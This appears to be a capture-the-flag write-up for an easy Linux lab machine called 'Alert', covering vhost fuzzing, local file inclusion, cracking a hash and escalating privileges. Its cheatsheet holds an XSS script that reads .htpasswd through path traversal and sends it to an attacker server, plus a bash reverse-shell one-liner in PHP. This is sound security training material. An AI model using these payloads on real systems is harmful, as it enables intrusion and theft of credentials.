# Alert \[Linux Easy]

## Report

A markdown visualizer website, running a script is the first thing that comes to mind. Vhost fuzzing shows a statistics vhost. Fuzzing for directories and files reveals a messages directory, messages.php and other stuff.

messages.php uses a parameter ?file to include files but how did we figure that out? Trial and error is what they say (file, page, document) This is our LFI endpoint. Now in our .md file we write a script to fetch a file and send to a http server that we host.

We still dont get the info here surprisingly, after visualizing we copy this link having our message and paste in the 'Contact Us' page and now we get a base64 encoded response.

Hashcat and we get a password. But what file did we use? .htpasswd is a thing apart from .htaccess. There is another file which gives you all the info you really need without the need to guess anything.

But knowing the filepath is a skill in itself i guess.

`/etc/apache2/sites-enabled/000-default.conf`

Once we get user access, netstat shows a localhost http page up, SSH port forward and we get access to the website.

Reading the readme file in the Application, located in the /opt directory, php can be executed in the directories within.

One quick php reverse shell and we are root.

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}
Nice cheatsheet having many XSS payloads even tho this machine didn't need all that
{% endembed %}

## Cheatsheet

```javascript
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.14.14:80?file_content=" + encodeURIComponent(data));
  }); 
</script>
```

```bash
ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://alert.htb:80 -H 'Host: FUZZ.alert.htb' -ac 
ssh -L 9091:localhost:8080 albert@10.10.11.44 -fN
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"'); ?>
```

## Proof

statistics returned with a code 401, we were so used to only accepting 200 right that was a surprise

ffuf dont work for URL fuzzing for some reason, so we use wfuzz&#x20;

HOW DO THAT JS SHI ONG BRO, learn js along the way ig like look up the shi you need specifically if it's file transfer&#x20;

> #### Simplified Flow
>
> 1. `fetch()` makes a request and gets a `Response` object (`response`).
> 2. `response.text()` extracts the response body as plain text.
> 3. The extracted text is passed to the next `.then()` block, where it's named `data`.
>
> #### Why the Variable Changes
>
> The variable names (`response` and `data`) are simply names chosen by the developer in the script to represent the value at each stage. The transformation happens because:
>
> * `response` is the initial HTTP response object.
> * `response.text()` processes the body of the response into a plain text string.
> * The result is passed to the next `.then()` as an argument, which is labeled `data`.
>
> **In `data => { fetch(...) }`:** The arrow function takes `data` as input (parameter) and performs an operation (sending the data to an external server).
>
> In short the arrow is just a simpler way of representing a function&#x20;
